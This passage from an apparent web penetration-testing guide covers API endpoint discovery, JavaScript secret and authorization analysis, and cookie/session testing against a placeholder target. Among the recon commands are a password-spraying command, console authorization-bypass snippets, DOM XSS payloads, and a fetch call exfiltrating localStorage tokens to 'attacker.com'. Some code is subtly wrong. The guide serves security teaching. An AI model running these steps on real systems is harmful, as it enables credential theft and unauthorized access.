+**Version Enumeration**
+
+```bash
+# Common version patterns
+for ver in v1 v2 v3 v4 v5 api/v1 api/v2; do
+    echo "[*] Testing $ver"
+    curl -I http://target.com/$ver/users
+done
+
+# Numeric versions
+for i in {1..10}; do
+    curl -I http://target.com/api/v$i/
+done
+
+# Date-based versions
+for year in 2020 2021 2022 2023 2024; do
+    curl -I http://target.com/api/$year-01-01/
+done
+```
+
+**Version Fuzzing Script**
+
+```python
+import requests
+
+target = "http://target.com"
+versions = [
+    "v1", "v2", "v3", "v4", "v5",
+    "api/v1", "api/v2", "api/v3",
+    "1.0", "2.0", "3.0",
+    "1", "2", "3", "4", "5"
+]
+
+endpoints = ["users", "products", "orders", "admin"]
+
+for version in versions:
+    for endpoint in endpoints:
+        url = f"{target}/{version}/{endpoint}"
+        try:
+            response = requests.get(url, timeout=3)
+            if response.status_code != 404:
+                print(f"[{response.status_code}] {url}")
+        except:
+            pass
+```
+
+### HTTP Method Discovery
+
+**Method Enumeration with curl**
+
+```bash
+# Test different HTTP methods
+for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
+    echo "[*] Testing $method"
+    curl -X $method -I http://target.com/api/users/1
+done
+
+# OPTIONS request for allowed methods
+curl -X OPTIONS http://target.com/api/users -v
+```
+
+**Burp Suite Intruder for Method Fuzzing**
+
+```
+1. Send API request to Intruder
+2. Clear all payload positions
+3. Change request method to §GET§
+4. Add payload list: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS, TRACE
+5. Start attack
+6. Analyze responses for different status codes
+```
+
+**Arjun - HTTP Parameter Discovery**
+
+```bash
+# Install
+pip3 install arjun
+
+# Discover GET parameters
+arjun -u http://target.com/api/users
+
+# Discover POST parameters
+arjun -u http://target.com/api/login -m POST
+
+# With custom headers
+arjun -u http://target.com/api/admin -H "Authorization: Bearer token"
+
+# Import from Burp
+arjun -i burp_requests.xml
+
+# JSON body parameter discovery
+arjun -u http://target.com/api/data -m POST -t json
+```
+
+### API Authentication Discovery
+
+**Common Authentication Endpoints**
+
+```bash
+# OAuth endpoints
+curl http://target.com/oauth/authorize
+curl http://target.com/oauth/token
+curl http://target.com/.well-known/openid-configuration
+
+# JWT endpoints
+curl http://target.com/api/auth/login
+curl http://target.com/api/auth/refresh
+curl http://target.com/api/token
+
+# API key endpoints
+curl http://target.com/api/keys
+curl http://target.com/api/apikeys
+curl http://target.com/api/tokens
+
+# Session endpoints
+curl http://target.com/api/session
+curl http://target.com/api/login
+curl http://target.com/api/authenticate
+```
+
+**Testing Authentication Methods**
+
+```bash
+# Basic Auth
+curl -u username:password http://target.com/api/users
+
+# Bearer Token
+curl -H "Authorization: Bearer token123" http://target.com/api/users
+
+# API Key in header
+curl -H "X-API-Key: key123" http://target.com/api/users
+curl -H "Api-Key: key123" http://target.com/api/users
+
+# API Key in query parameter
+curl http://target.com/api/users?api_key=key123
+curl http://target.com/api/users?apikey=key123
+
+# Cookie-based
+curl -b "session=sessiontoken" http://target.com/api/users
+```
+
+### Burp Suite for API Discovery
+
+**Passive API Discovery**
+
+```
+1. Navigate application with Burp proxy enabled
+2. Target > Site map
+3. Filter for /api, /v[0-9], /rest, /graphql
+4. Review all API calls in HTTP history
+5. Note unique endpoints and parameters
+```
+
+**Active API Discovery with Spider**
+
+```
+1. Target > Site map > Right-click target
+2. Spider this host
+3. Options > Configure to include API patterns
+4. Review discovered API endpoints
+```
+
+**Content Discovery**
+
+```
+1. Target > Site map > Right-click on /api
+2. Engagement tools > Discover content
+3. Configure wordlists for API paths
+4. Review discovered content
+```
+
+### Kiterunner - API Enumeration Tool
+
+```bash
+# Install
+git clone https://github.com/assetnote/kiterunner.git
+cd kiterunner
+make build
+
+# Basic scan with common routes
+./kr scan http://target.com -w routes-large.kite
+
+# Scan specific API path
+./kr scan http://target.com/api -w routes-small.kite
+
+# Brute force mode
+./kr brute http://target.com/api -w routes.txt
+
+# With authentication
+./kr scan http://target.com -H "Authorization: Bearer token" -w routes.kite
+
+# Output to JSON
+./kr scan http://target.com -w routes.kite -o json > results.json
+```
+
+### Postman Collection Discovery
+
+**Finding Exposed Collections**
+
+```bash
+# Common locations
+curl http://target.com/postman_collection.json
+curl http://target.com/api/postman_collection.json
+curl http://target.com/collection.json
+
+# Search in JavaScript files
+grep -r "postman" *.js
+grep -r "collection" *.js | grep -i "json"
+```
+
+**Postman Collection Analysis**
+
+```python
+import json
+import requests
+
+# Download collection
+response = requests.get("http://target.com/postman_collection.json")
+collection = response.json()
+
+# Extract all endpoints
+def extract_endpoints(item, base_url=""):
+    endpoints = []
+    
+    if isinstance(item, dict):
+        if 'request' in item:
+            method = item['request'].get('method', 'GET')
+            url = item['request'].get('url', {})
+            
+            if isinstance(url, str):
+                endpoints.append(f"{method} {url}")
+            elif isinstance(url, dict):
+                raw_url = url.get('raw', '')
+                endpoints.append(f"{method} {raw_url}")
+        
+        if 'item' in item:
+            for subitem in item['item']:
+                endpoints.extend(extract_endpoints(subitem, base_url))
+    
+    elif isinstance(item, list):
+        for subitem in item:
+            endpoints.extend(extract_endpoints(subitem, base_url))
+    
+    return endpoints
+
+# Parse collection
+all_endpoints = extract_endpoints(collection)
+for endpoint in all_endpoints:
+    print(endpoint)
+```
+
+### API Blueprint and RAML Discovery
+
+**API Blueprint**
+
+```bash
+# Find API Blueprint files
+curl http://target.com/api.md
+curl http://target.com/apiary.apib
+curl http://target.com/blueprint.md
+
+# Parse API Blueprint
+npm install -g drafter
+drafter api.md -o api.json
+```
+
+**RAML Files**
+
+```bash
+# Find RAML files
+curl http://target.com/api.raml
+curl http://target.com/api/api.raml
+
+# Parse RAML
+npm install -g raml2html
+raml2html api.raml > api.html
+```
+
+### Mobile App API Discovery
+
+**Decompiling APK for API Endpoints**
+
+```bash
+# Decompile APK with apktool
+apktool d app.apk -o app_decompiled
+
+# Search for API endpoints
+grep -r "http" app_decompiled/
+grep -r "api" app_decompiled/ | grep -E "http|www"
+
+# Search in strings
+strings app_decompiled/classes.dex | grep -E "http|api|endpoint"
+
+# Using jadx
+jadx -d output_dir app.apk
+grep -r "Retrofit\|OkHttp\|HttpClient" output_dir/
+```
+
+**Intercepting Mobile API Traffic**
+
+```bash
+# Setup proxy
+# Configure device to use Burp/mitmproxy
+
+# Install CA certificate on device
+# Android: Settings > Security > Install from storage
+# iOS: Settings > General > Profile
+
+# Using mitmproxy
+mitmproxy -p 8080
+
+# Save intercepted requests
+mitmdump -w traffic.dump
+
+# Extract API calls from dump
+mitmproxy -r traffic.dump -s extract_apis.py
+```
+
+**extract_apis.py for mitmproxy**
+
+```python
+def response(flow):
+    if "api" in flow.request.pretty_url or "/v" in flow.request.pretty_url:
+        print(f"{flow.request.method} {flow.request.pretty_url}")
+        
+        # Log to file
+        with open("api_endpoints.txt", "a") as f:
+            f.write(f"{flow.request.method} {flow.request.pretty_url}\n")
+```
+
+### WSDL Enumeration (SOAP APIs)
+
+**WSDL Discovery**
+
+```bash
+# Common WSDL locations
+curl http://target.com/service?wsdl
+curl http://target.com/services/ServiceName?wsdl
+curl http://target.com/soap?wsdl
+curl http://target.com/api/soap?wsdl
+curl http://target.com/ws/Service?wsdl
+
+# ASMX endpoints (ASP.NET)
+curl http://target.com/Service.asmx?wsdl
+curl http://target.com/webservice.asmx?wsdl
+```
+
+**WSDL Fuzzing**
+
+```bash
+# Create SOAP service wordlist
+cat > soap_services.txt << EOF
+UserService
+AuthService
+AdminService
+DataService
+PaymentService
+OrderService
+ProductService
+ReportService
+EOF
+
+# Fuzz for WSDL files
+ffuf -u http://target.com/FUZZ?wsdl -w soap_services.txt -mc 200
+ffuf -u http://target.com/services/FUZZ?wsdl -w soap_services.txt -mc 200
+```
+
+**Parsing WSDL**
+
+```bash
+# Download WSDL
+curl http://target.com/service?wsdl -o service.wsdl
+
+# Extract operations
+grep "<operation" service.wsdl
+
+# Generate SOAP requests with wsdler
+pip3 install wsdler
+python3 -m wsdler http://target.com/service?wsdl
+```
+
+### API Rate Limit Discovery
+
+**Testing for Rate Limits**
+
+```bash
+# Send multiple rapid requests
+for i in {1..100}; do
+    curl -I http://target.com/api/users -w "\n%{http_code}\n"
+done
+
+# Monitor for rate limit responses
+# HTTP 429 Too Many Requests
+# HTTP 403 with rate limit message
+```
+
+**Rate Limit Header Analysis**
+
+```bash
+# Check for rate limit headers
+curl -I http://target.com/api/users | grep -i "rate\|limit\|quota"
+
+# Common rate limit headers:
+# X-RateLimit-Limit
+# X-RateLimit-Remaining
+# X-RateLimit-Reset
+# Retry-After
+```
+
+### Subdomain-Specific API Discovery
+
+**API Subdomain Enumeration**
+
+```bash
+# Common API subdomains
+for sub in api api-v1 api-v2 api1 api2 dev-api staging-api test-api internal-api admin-api; do
+    echo "[*] Testing $sub.target.com"
+    curl -I http://$sub.target.com
+done
+
+# Using subfinder
+subfinder -d target.com | grep -i api
+
+# Using amass
+amass enum -d target.com | grep -i api
+```
+
+### Automated API Discovery Workflow
+
+**Comprehensive Discovery Script**
+
+```bash
+#!/bin/bash
+
+TARGET="$1"
+
+echo "[*] Starting API discovery for $TARGET"
+
+# 1. Check robots.txt
+echo "[+] Checking robots.txt"
+curl -s "$TARGET/robots.txt" | grep -i "api"
+
+# 2. Check common API documentation
+echo "[+] Checking API documentation endpoints"
+for doc in swagger swagger.json swagger-ui api-docs redoc graphql; do
+    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$doc")
+    echo "[$status] $TARGET/$doc"
+done
+
+# 3. JavaScript analysis
+echo "[+] Analyzing JavaScript files"
+curl -s "$TARGET" | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
+    if [[ $js == /* ]]; then
+        js_url="$TARGET$js"
+    else
+        js_url="$js"
+    fi
+    echo "[*] Downloading $js_url"
+    curl -s "$js_url" | grep -oP '/api/[^\s"'\'']+' | sort -u
+done
+
+# 4. Common API endpoints
+echo "[+] Testing common API endpoints"
+for endpoint in users products orders admin health status version; do
+    for version in api/v1 api/v2 api v1 v2; do
+        url="$TARGET/$version/$endpoint"
+        status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
+        if [[ $status != "404" ]]; then
+            echo "[$status] $url"
+        fi
+    done
+done
+
+echo "[*] Discovery complete"
+```
+
+### GraphQL Specific Tools
+
+**GraphQL Cop - Security Auditor**
+
+```bash
+# Install
+pip3 install graphql-cop
+
+# Basic audit
+graphql-cop -t http://target.com/graphql
+
+# With authentication
+graphql-cop -t http://target.com/graphql -H "Authorization: Bearer token"
+```
+
+**CrackQL - GraphQL Password Spraying**
+
+```bash
+# Install
+git clone https://github.com/nicholasaleks/CrackQL.git
+cd CrackQL
+
+# Run password spray
+python3 CrackQL.py -t http://target.com/graphql -q queries/login.graphql -u usernames.txt -p passwords.txt
+```
+
+**GraphQLmap**
+
+```bash
+# Install
+git clone https://github.com/swisskyrepo/GraphQLmap.git
+cd GraphQLmap
+
+# Interactive mode
+python3 graphqlmap.py -u http://target.com/graphql
+
+# Dump schema
+python3 graphqlmap.py -u http://target.com/graphql --dump
+```
+
+---
+
+## Important Related Topics
+
+- **API Authentication Bypass Techniques** including JWT manipulation, OAuth flaws, and API key exploitation
+- **API Parameter Pollution** and mass assignment vulnerabilities
+- **BOLA/IDOR in APIs** (Broken Object Level Authorization)
+- **API Rate Limit Bypass** techniques
+- **GraphQL Injection and Query Batching** attacks
+- **CORS Misconfiguration** in API contexts
+- **API Gateway Security Testing** (AWS API Gateway, Kong, etc.)
+- **WebSocket API Discovery and Testing**
+- **gRPC and Protocol Buffer** enumeration and exploitation
+
+---
+
+## JavaScript Analysis
+
+JavaScript analysis identifies client-side vulnerabilities, extracts sensitive information, reveals business logic exploitable for privilege escalation, and uncovers hardcoded credentials or API endpoints enabling backend exploitation.
+
+**Static JavaScript Analysis and Source Review**
+
+Extract and analyze application JavaScript:
+
+```bash
+# Discover JavaScript files via network inspection
+burp suite passive scanner identifies all JS files
+
+# Browser developer tools
+# Open DevTools (F12) → Sources tab
+# View all loaded scripts
+
+# curl for direct retrieval
+curl -s https://target.com/assets/app.js | head -100
+curl -s https://target.com/assets/bundle.js
+
+# Enumerate common JavaScript paths
+for path in /js /assets /static /src /scripts; do
+    curl -s https://target.com$path/ | grep -oE "href=\"[^\"]*\.js\"" | cut -d'"' -f2
+done
+
+# Extract embedded JavaScript from HTML
+curl -s https://target.com | grep -oE "<script[^>]*>.*?</script>" | sed 's/<[^>]*>//g'
+```
+
+JavaScript discovery techniques:
+
+```bash
+# Passive source finding
+# Use SecurityHeaders.com to identify CDN-hosted scripts
+
+# Content Security Policy analysis
+curl -I https://target.com | grep -i "content-security-policy"
+
+# Wayback Machine enumeration
+# https://web.archive.org/web/*/target.com/js/*
+# Historical JavaScript versions may leak vulnerabilities
+
+# GitHub/public repository search
+# Repository search for target domain
+# Often reveals development JavaScript with debug statements
+```
+
+[Inference] JavaScript discovery reveals application structure and dependencies, enabling targeted analysis of specific components vulnerable to client-side attacks.
+
+**API Endpoint Extraction**
+
+Identify backend APIs from client-side code:
+
+```bash
+# Extract API calls from JavaScript
+curl -s https://target.com/assets/app.js | grep -oE "(https?://|/)[a-zA-Z0-9/_\-\.]*\.(php|api|endpoint|json)" | sort -u
+
+# Pattern matching for common API patterns
+grep -oE "(/api/|/v[0-9]/|/ajax/)[^'\"]*" app.js | sort -u
+
+# Fetch calls indicating endpoints
+grep -oE "fetch\(['\"]([^'\"]+)['\"]" app.js | cut -d"'" -f2 | sort -u
+
+# Axios/jQuery AJAX patterns
+grep -oE "axios\.(get|post|put|delete)\(['\"]([^'\"]+)" app.js | cut -d"'" -f2 | sort -u
+grep -oE "\$.ajax\(\{[^}]*url:['\"]([^'\"]+)" app.js | cut -d"'" -f2 | sort -u
+```
+
+Discovered endpoint analysis:
+
+```bash
+# Extract endpoints to file
+curl -s https://target.com/assets/app.js | grep -oE "(/api/[a-zA-Z0-9/_\-\.]*)" | sort -u > api_endpoints.txt
+
+# Test discovered endpoints
+while read endpoint; do
+    echo "[*] Testing $endpoint"
+    curl -s https://target.com$endpoint | head -20
+done < api_endpoints.txt
+
+# Categorize by HTTP method
+grep -E "(GET|POST|PUT|DELETE|PATCH)" app.js | grep -oE "/api/[a-zA-Z0-9/_\-\.]*" | sort -u > api_methods.txt
+```
+
+[Inference] JavaScript analysis reveals API endpoints frequently used by client-side code but not otherwise discoverable through standard reconnaissance, enabling direct backend API testing.
+
+**Sensitive Data Extraction from JavaScript**
+
+Identify hardcoded credentials, keys, and configuration:
+
+```bash
+# Search for common secret patterns
+grep -iE "(password|secret|token|api.?key|apikey|private.?key|aws_key)" app.js | head -20
+
+# Specific pattern matching
+grep -oE "api[_-]?key['\"]?\s*[:=]\s*['\"]?[a-zA-Z0-9]{20,}" app.js
+
+# AWS credentials
+grep -oE "AKIA[0-9A-Z]{16}" app.js
+
+# Google API keys
+grep -oE "AIza[0-9A-Za-z\-_]{35}" app.js
+
+# JWT tokens
+grep -oE "eyJ[a-zA-Z0-9_\-\.]*" app.js
+
+# Database connection strings
+grep -iE "(mongodb|mysql|postgres)://[^'\"]*" app.js
+
+# URLs to internal services
+grep -oE "https?://[a-zA-Z0-9\-\.]+\.(internal|local|dev|staging)" app.js
+```
+
+Analysis of findings:
+
+```bash
+# Aggregate suspicious patterns
+cat app.js | sed 's/[;,{}]/\n/g' | grep -E "password|secret|token|key|credential" | sort -u
+
+# Context analysis
+# Find variable assignments suspicious values
+grep -B2 -A2 "password.*=" app.js
+grep -B2 -A2 "secret.*=" app.js
+
+# Test credentials immediately
+# API key validity testing
+curl -H "Authorization: Bearer $API_KEY" https://api.target.com/user
+```
+
+[Inference] Hardcoded credentials in JavaScript provide immediate backend system access, with [Unverified] credential storage in client-side code being common in development and hastily deployed applications.
+
+**Client-Side Authorization Logic Analysis**
+
+Identify authorization flaws in client code:
+
+```bash
+# Search for role-based access control
+grep -iE "(admin|moderator|role|permission|isadmin|candelete)" app.js | head -20
+
+# JavaScript privilege checking
+grep -E "if\s*\([^)]*admin" app.js
+grep -E "if\s*\([^)]*permission" app.js
+grep -E "if\s*\([^)]*privilege" app.js
+
+# Example vulnerable patterns:
+# if (user.isAdmin) { show_admin_panel(); }
+# if (currentUser.role == 'admin') { enableDelete(); }
+
+# Extract full authorization blocks
+awk '/if.*admin/,/}/' app.js | head -30
+
+# Hidden button/menu analysis
+grep -iE "(display:?none|hidden|visibility:?hidden)" app.js
+grep -E "style=['\"].*display.*none" app.js
+```
+
+Authorization bypass exploitation:
+
+```javascript
+// Common client-side bypass: Modify JavaScript at runtime
+
+// In browser console:
+// 1. Directly set authorization flag
+user.isAdmin = true;
+
+// 2. Modify DOM elements hidden by CSS
+document.querySelectorAll('[style*="display:none"]').forEach(el => {
+    el.style.display = 'block';
+});
+
+// 3. Execute administrative functions directly
+delete_user(target_user_id);  // If function exists in scope
+
+// 4. Modify permission checks
+window.checkPermission = () => true;  // Override function
+
+// 5. Access hidden API calls
+fetch('/api/admin/users').then(r => r.json()).then(console.log);
+```
+
+[Inference] Client-side authorization enforcement creates false security perception but [Unverified] does not prevent unauthorized access when backend lacks proper authentication, enabling straightforward bypass through console manipulation or direct API calls.
+
+**Local Storage and Session Storage Analysis**
+
+Extract sensitive data from browser storage:
+
+```bash
+# Analyze JavaScript accessing localStorage/sessionStorage
+grep -E "(localStorage|sessionStorage)\.(getItem|setItem|removeItem)" app.js
+
+# Extract storage keys being used
+grep -oE "(localStorage|sessionStorage)\.getItem\(['\"]([^'\"]+)" app.js | cut -d"'" -f2 | sort -u
+
+# Check for credential storage patterns
+grep -E "(localStorage|sessionStorage)\.setItem.*password" app.js
+grep -E "(localStorage|sessionStorage)\.setItem.*token" app.js
+grep -E "(localStorage|sessionStorage)\.setItem.*session" app.js
+
+# Sensitive data patterns stored
+grep -oE "(localStorage|sessionStorage)\.setItem\(['\"]([^'\"]+)['\"],\s*['\"]([^'\"]+)" app.js
+```
+
+Browser console exploitation:
+
+```javascript
+// Access stored data from browser console
+// Note: This requires user to be on target website
+
+// View all localStorage data
+for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    const value = localStorage.getItem(key);
+    console.log(key + ": " + value);
+}
+
+// View specific sensitive data
+console.log(localStorage.getItem('auth_token'));
+console.log(localStorage.getItem('jwt'));
+console.log(sessionStorage.getItem('user_session'));
+
+// Extract and exfiltrate
+const data = {};
+for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    data[key] = localStorage.getItem(key);
+}
+fetch('https://attacker.com/exfil?data=' + encodeURIComponent(JSON.stringify(data)));
+
+// Persistence payload injection
+localStorage.setItem('persist_payload', 'malicious_javascript_code');
+// Code re-injected on subsequent page loads
+```
+
+[Inference] Local/session storage analysis reveals application state management patterns and frequently contains sensitive data (tokens, session IDs) [Unverified] with weaker protection compared to HTTP-only cookies.
+
+**DOM-based XSS Vulnerability Identification**
+
+Locate JavaScript patterns vulnerable to DOM-based XSS:
+
+```bash
+# Identify DOM manipulation patterns
+grep -E "(innerHTML|document\.write|eval|setTimeout.*)" app.js | head -20
+
+# innerHTML usage (potentially dangerous)
+grep -E "\.innerHTML\s*=" app.js
+
+# eval() and similar dangerous functions
+grep -E "(eval|Function|setTimeout|setInterval).*\$|user|input" app.js
+
+# Unsanitized data flow paths
+grep -B3 -A3 "innerHTML.*location\." app.js
+grep -B3 -A3 "innerHTML.*user" app.js
+
+# URL/query parameter usage in DOM
+grep -E "(location\.search|URLSearchParams|window\.location\.hash)" app.js | head -10
+```
+
+DOM XSS vulnerability patterns:
+
+```javascript
+// Vulnerable pattern 1: Direct innerHTML with user input
+var user_name = location.hash.split('=')[1];
+document.getElementById('greeting').innerHTML = 'Welcome ' + user_name;
+// Attack: #name=<img src=x onerror=alert('XSS')>
+
+// Vulnerable pattern 2: eval() with user data
+var param = new URLSearchParams(location.search);
+var data = param.get('data');
+eval(data);  // Directly executes attacker-supplied code
+
+// Vulnerable pattern 3: document.write with unsanitized input
+var search = location.search.substring(1);
+document.write('<h1>' + search + '</h1>');
+
+// Vulnerable pattern 4: setTimeout with string concatenation
+var delay = location.hash.substring(1);
+setTimeout('alert("' + delay + '")', 1000);
+
+// Vulnerable pattern 5: Direct object property modification
+var user = {};
+Object.assign(user, JSON.parse(location.hash.substring(1)));
+// Attack: #{"admin":true}
+```
+
+Exploitation verification:
+
+```bash
+# Test identified vulnerabilities
+# Create proof-of-concept payloads
+
+# URL encoding required for many payloads
+PAYLOAD='<img src=x onerror=alert("XSS")>'
+ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
+
+# Test via curl (verification)
+curl "https://target.com/page#name=$ENCODED" -o /dev/null -w "%{http_code}\n"
+
+# Browser-based testing
+# Open DevTools console
+# Execute: window.location = 'https://target.com/page#name=' + encodeURIComponent(PAYLOAD)
+# Observe alert() execution
+```
+
+[Inference] DOM-based XSS vulnerabilities exploit client-side JavaScript data handling and require identifying specific source→sink patterns where user input flows to dangerous functions without sanitization.
+
+**JavaScript Obfuscation and De-obfuscation**
+
+Analyze intentionally obscured JavaScript:
+
+```bash
+# Detect obfuscation
+file app.js
+# High entropy indicates obfuscation/minification
+
+# De-minification (removes whitespace, shortens variables)
+curl -s https://target.com/assets/app.js | python3 -m json.tool 2>/dev/null
+
+# Use online de-minifiers
+# https://beautifier.io/
+# Upload minified JavaScript, receives readable version
+
+# Command-line de-minification
+pip install jsbeautifier
+js-beautify app.js > app_beautiful.js
+
+# Analyze for common obfuscation patterns
+grep -E "\\\\x[0-9a-f]{2}" app.js  # Hex-encoded strings
+grep -E "String\.fromCharCode" app.js  # Character code sequences
+
+# Decrypt common obfuscation
+python3 << 'EOF'
+import re
+js_content = open('app.js').read()
+
+# Replace String.fromCharCode patterns
+def decode_fromcharcode(match):
+    codes = re.findall(r'\\d+', match.group(0))
+    return ''.join(chr(int(c)) for c in codes)
+
+decoded = re.sub(r'String\.fromCharCode\([0-9,]+\)', decode_fromcharcode, js_content)
+print(decoded)
+EOF
+```
+
+Advanced deobfuscation:
+
+```bash
+# For complex obfuscation, run in JavaScript environment
+node << 'EOF'
+// Load obfuscated file
+const obfuscated = require('fs').readFileSync('app.js', 'utf8');
+
+// Execute in controlled environment
+const vm = require('vm');
+const context = vm.createContext({
+    console: console,
+    window: {},
+    document: {}
+});
+
+// Capture executed code
+vm.runInContext(obfuscated, context);
+
+// Analyze resulting objects
+console.log(context.window);  // Exposed functions/data
+EOF
+```
+
+[Inference] Obfuscated JavaScript remains vulnerable to same attacks as readable code—obfuscation obscures logic but doesn't prevent exploitation when vulnerabilities exist in underlying algorithms.
+
+**Third-Party Library Vulnerability Analysis**
+
+Identify vulnerable dependencies:
+
+```bash
+# Extract library information from JavaScript
+grep -E "\/\/.*library|\/\*.*v?[0-9]+\.[0-9]+" app.js | head -20
+
+# Package.json analysis (if accessible)
+curl -s https://target.com/package.json | jq . 
+
+# Identify libraries and versions
+grep -oE "(jquery|bootstrap|angular|react|vue).*v?[0-9]+\.[0-9]+\.[0-9]+" app.js | sort -u
+
+# Check library versions against known vulnerabilities
+# For example: jQuery 1.x-2.x known for XSS vulnerabilities
+
+# Enumerate CDN-hosted libraries
+grep -oE "https://cdnjs\.cloudflare\.com/ajax/libs/[a-zA-Z0-9\-]+/[0-9\.]+/" app.js | sort -u
+
+# Test library vulnerabilities
+# https://www.cvedetails.com/
+# Search for library name and version
+
+# Automated scanning
+npm install snyk -g
+snyk test app.js  # Tests JavaScript dependencies
+```
+
+Common vulnerable libraries:
+
+```
+jQuery < 3.0: DOM-based XSS, selector injection
+Bootstrap < 3.4: XSS in carousel plugin
+Angular < 1.5: Multiple XSS vulnerabilities
+React: Generally well-maintained, check version-specific CVEs
+Lodash < 4.17.21: Prototype pollution vulnerabilities
+```
+
+[Inference] Third-party library vulnerabilities enable widespread exploitation when identified, particularly affecting library components automatically loaded by all users.
+
+---
+
+## Cookie Analysis
+
+Cookie analysis identifies authentication tokens, session IDs, preference data, and tracking mechanisms—revealing opportunities for session hijacking, privilege escalation, and privacy violations.
+
+**Cookie Discovery and Enumeration**
+
+Identify all cookies set by application:
+
+```bash
+# Browser DevTools → Application → Cookies
+# Lists all cookies for domain
+
+# curl with verbose output
+curl -v https://target.com 2>&1 | grep -i "set-cookie"
+
+# Burp Suite passive scanning
+# Proxy traffic through Burp
+# Automatically discovers and categorizes cookies
+
+# Automated cookie enumeration
+python3 << 'EOF'
+import requests
+from urllib.parse import urlparse
+
+session = requests.Session()
+response = session.get('https://target.com')
+
+# Extract cookies
+for cookie in session.cookies:
+    print(f"Name: {cookie.name}")
+    print(f"Value: {cookie.value}")
+    print(f"Domain: {cookie.domain}")
+    print(f"Path: {cookie.path}")
+    print(f"Expires: {cookie.expires}")
+    print(f"Secure: {cookie.secure}")
+    print(f"HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
+    print("---")
+EOF
+
+# JavaScript access to cookies
+# Browser console
+console.log(document.cookie);
+
+# Parse individual cookies
+document.cookie.split(';').forEach(c => console.log(c.trim()));
+```
+
+[Inference] Cookie enumeration identifies all tracking and session mechanisms, revealing authentication tokens and preference data exploitable for session attacks.
+
+**Session Cookie Analysis**
+
+Examine authentication and session tokens:
+
+```bash
+# Identify session cookies by name pattern
+# Common names: PHPSESSID, JSESSIONID, session_id, sid, sessionid
+
+# Extract session cookie
+curl -s -c cookies.txt https://target.com > /dev/null
+cat cookies.txt | grep -E "sid|session|phpsessid"
+
+# Analyze session cookie properties
+curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep -iE "sid|session|phpsessid"
+
+# Check for secure flags
+# Output format: Set-Cookie: SESSIONID=abc123; Path=/; Secure; HttpOnly
+```
+
+Session cookie security assessment:
+
+```bash
+# Insecure configuration indicators:
+
+# 1. No Secure flag (vulnerable to MITM over HTTP)
+curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep -v Secure
+
+# 2. No HttpOnly flag (vulnerable to JavaScript access/XSS)
+curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep -v HttpOnly
+
+# 3. No SameSite attribute (vulnerable to CSRF)
+curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep -v SameSite
+
+# 4. Long expiration time (extended session window)
+curl -v https://target.com 2>&1 | grep -i "set-cookie" | grep "Max-Age=\|expires="
+
+# 5. Weak randomness indicators
+# Extract session ID and analyze entropy
+SESSION=$(curl -s -c - https://target.com | grep SESSIONID | awk '{print $NF}')
+echo $SESSION | od -A x -t x1z
+```
+
+[Inference] Missing security flags on session cookies enable [Unverified] MITM interception, XSS-based session theft, and CSRF attacks depending on configuration deficiencies.
+
+**Session Token Randomness Testing**
+
+Assess session ID generation quality:
+
+```bash
+# Collect multiple session IDs
+for i in {1..100}; do
+    curl -s -c - https://target.com | grep SESSIONID | awk '{print $NF}' >> sessions.txt
+done
+
+# Analyze token patterns
+cat sessions.txt | head -10
+
+# Check for sequential or predictable patterns
+# If session IDs are sequential (1, 2, 3, etc.) - highly vulnerable
+sort sessions.txt | uniq | wc -l  # Count unique sessions
+# Should equal 100 (all unique). Duplicates indicate poor randomness
+
+# Entropy analysis
+python3 << 'EOF'
+import re
+from collections import Counter
+
+sessions = open('sessions.txt').read().strip().split('\n')
+
+# Analyze character distribution (should be uniform)
+char_counts = Counter()
+for session in sessions:
+    for char in session:
+        char_counts[char] += 1
+
+print("Character distribution (should be uniform for secure randomness):")
+for char, count in sorted(char_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
+    print(f"{char}: {count}")
+
+# Check for patterns
+print("\nChecking for sequential patterns...")
+for i in range(len(sessions)-1):
+    # Convert hex to int if applicable
+    try:
+        val1 = int(sessions[i], 16)
+        val2 = int(sessions[i+1], 16)
+        if val2 == val1 + 1:
+            print(f"Sequential pair found: {sessions[i]} → {sessions[i+1]}")
+    except:
+        pass
+EOF
+
+# Statistical testing (NIST randomness tests)
+# pip install ent
+ent sessions.txt  # Entropy analysis
+```
+
+[Inference] Weak session ID randomness enables [Inference] session prediction attacks where attackers guess valid session IDs without capture, achieving unauthorized session hijacking through brute-force.
+
+**Cookie Encryption and Encoding Analysis**
+
+Determine if cookies contain encrypted/encoded data:
+
+```bash
+# Base64 detection (common encoding)
+echo "SESSION_VALUE" | base64 -w0
+# If session value decodes to readable text - likely base64 encoded
+
+# Automated base64 detection
+python3 << 'EOF'
+import base64
+
+session_value = "YWJjMTIzZGVmNDU2"  # Example encoded session
+
+try:
+    decoded = base64.b64decode(session_value).decode('utf-8')
+    if decoded.isprintable():
+        print(f"Base64 detected: {session_value} → {decoded}")
+except:
+    print("Not valid base64")
+EOF
+
+# Encryption detection (ciphertext typically high entropy)
+python3 << 'EOF'
+import math
+
+def entropy(data):
+    return -sum((data.count(chr(i)) / len(data)) * math.log2(data.count(chr(i)) / len(data) + 1e-10) for i in range(256))
+
+# Encrypted data: entropy ~7.9 (near-maximum)
+# Plain text: entropy ~4.5-5.5
+# Base64 encoded plain: entropy ~5.75
+EOF
+
+# Identify encryption algorithms
+# XOR-encrypted (low entropy xor patterns)
+# AES (high entropy if properly implemented)
+# DES (legacy encryption - weaker)
+
+# Attempt common cookie encryption attacks
+# 1. Test for ECB mode (identical plaintext blocks produce identical ciphertext)
+# 2. Perform dictionary attacks on encrypted cookies
+# 3. Analyze key derivation (if deterministic - vulnerable to prediction)
+```
+
+[Unverified] Encrypted cookies provide [Inference] data confidentiality but cookies must still be securely transmitted (HTTPS with Secure flag) and protected from XSS theft if accessible to JavaScript.
+
+**Cookie-Based Authentication Bypass**
+
+Exploit weak session management:
+
+```bash
+# 1. Session fixation attack
+# Force user to specific session ID
+# Then user authenticates with that ID
+
+# Create malicious session
+FAKE_SESSION="admin_session_12345"
+
+# Craft login URL with session cookie
